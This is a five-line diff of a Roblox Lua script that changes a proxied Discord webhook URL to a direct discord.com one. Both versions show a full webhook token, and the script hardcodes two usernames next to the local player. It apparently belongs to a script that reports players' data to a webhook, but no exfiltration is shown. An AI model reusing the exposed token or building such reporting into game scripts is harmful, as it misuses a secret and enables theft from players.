@@ -1,5 +1,5 @@
 local player = game:GetService("Players").LocalPlayer
-local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1429509611173707858/I_Ph9seXu0Fa-652BET-vfssKq7N6HBFU9kw4Lbrovb5Wpk57ZmS3d4ynznwxNlqfaYw"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1429509611173707858/I_Ph9seXu0Fa-652BET-vfssKq7N6HBFU9kw4Lbrovb5Wpk57ZmS3d4ynznwxNlqfaYw"
 Username = "kyurinlikett" 
 Username2 = "Roopo1344"
 local placeId = game.PlaceId
